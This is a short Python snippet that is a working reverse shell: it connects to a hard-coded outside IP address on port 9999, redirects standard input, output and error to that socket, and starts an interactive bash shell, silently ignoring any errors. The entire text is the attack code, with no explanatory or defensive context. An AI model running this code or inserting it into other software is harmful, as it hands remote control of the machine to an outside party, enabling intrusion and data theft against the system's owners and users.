try:
    import os
    import socket
    import subprocess
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("47.116.205.76", 9999))
    [os.dup2(s.fileno(), i) for i in range(3)]
    subprocess.call(['/bin/bash', '-i'])
except:
    pass
